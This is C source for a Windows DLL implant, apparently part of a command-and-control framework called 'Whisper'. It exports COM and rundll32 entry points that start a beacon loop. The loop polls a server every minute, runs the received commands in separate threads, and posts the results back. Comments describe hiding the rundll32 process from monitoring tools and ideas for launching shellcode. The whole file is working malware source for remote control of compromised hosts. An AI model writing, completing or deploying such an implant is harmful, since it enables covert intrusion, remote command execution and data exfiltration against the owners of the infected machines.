#include "comms_http.h"
#include "type_conversions.h"
#include "whisper_commands.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include <windows.h>
#include <stdio.h>

// Function prototype
DWORD WINAPI BeaconLoop();
DWORD WINAPI execute_async(LPVOID);

// Standard Exported Functions

//note: The thread allows for the functions to detach/return okay, makes it more normal + cleaner
//this also seems to hide rundll32 from showing up in processhacker. cewl

//other ideas: Queue APC call to start if doing shellcode

//COM
__declspec(dllexport) HRESULT DllRegisterServer() {
    MessageBox(NULL, "Executed via DllRegisterServer!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
    return S_OK;
}
//COM
__declspec(dllexport) HRESULT DllUnregisterServer() {
    MessageBox(NULL, "Executed via DllUnregisterServer!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
    return S_OK;
}


 
// Other options
__declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    MessageBox(NULL, "Executed via Run!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
}
// Other options
__declspec(dllexport) void Start() {
    MessageBox(NULL, "Executed via Start!", "DLL Execution", MB_OK);
    //HANDLE thread = WhisperCreateThread(NULL, 0, BeaconLoop, NULL, 0, NULL);
    //if (thread) CloseHandle(thread);
    BeaconLoop();
}


// Global flag for thread control
volatile BOOL keepRunning = TRUE;

// Entry point for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DEBUG_LOG("[DLL] Loaded into process\n");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_LOG("[DLL] Unloaded from process\n");
        keepRunning = FALSE;
        break;
    }
    return TRUE;
}


// Main beacon loop (runs in a separate thread)
DWORD WINAPI BeaconLoop() {
    DEBUG_LOG("[THREAD] Beacon loop started\n");

    while (keepRunning) {
        JsonDataCommand command_struct = get_command_data();

        if (command_struct.command) {
            JsonDataCommand* command_copy = (JsonDataCommand*)malloc(sizeof(JsonDataCommand));
            if (!command_copy) {
                DEBUG_LOG("[THREAD] Memory allocation failed\n");
                continue;
            }

            command_copy->command = _strdup(command_struct.command);
            command_copy->command_id = _strdup(command_struct.command_id);
            command_copy->args = command_struct.args;

            HANDLE thread = WhisperCreateThread(NULL, 0, execute_async, (LPVOID)command_copy, 0, NULL);
            if (thread) {
                CloseHandle(thread);
            }
            else {
                DEBUG_LOG("[THREAD] Failed to create execution thread\n");
                free(command_copy->command);
                free(command_copy->command_id);
                free(command_copy);
            }

            free(command_struct.command);
            free(command_struct.command_id);
        }
        else {
            DEBUG_LOG("[THREAD] Failed to decode command\n");
        }

        WhisperSleep(60 * 1000);
    }

    DEBUG_LOG("[THREAD] Beacon loop exiting\n");
    return 0;
}

// Thread function for executing commands asynchronously
DWORD WINAPI execute_async(LPVOID arg) {
    JsonDataCommand* command_struct = (JsonDataCommand*)arg;
    if (!command_struct) return 1;

    DEBUG_LOG("[THREAD] Decoded Command: %s\n", command_struct->command);

    JsonData* response_struct = (JsonData*)malloc(sizeof(JsonData));
    if (!response_struct) {
        DEBUG_LOG("[THREAD] Memory allocation failed\n");
        return 1;
    }

    strncpy_s(response_struct->id, sizeof(response_struct->id), "550e8400-e29b-41d4-a716-446655440000", _TRUNCATE);
    response_struct->data = NULL;

    parse_command(command_struct->command, command_struct->args, response_struct);

    DEBUG_LOG("[THREAD] UUID: %s\n", response_struct->id);
    DEBUG_LOG("[THREAD] COMMAND_ID: %s\n", command_struct->command_id);
    DEBUG_LOG("[THREAD] DATA: %s\n", response_struct->data ? response_struct->data : "NULL");

    char* encoded_json_response = encode_json(response_struct->id, response_struct->data, command_struct->command_id);
    post_data(encoded_json_response);

    free(command_struct->command);
    free(command_struct->command_id);
    free(response_struct);
    return 0;
}
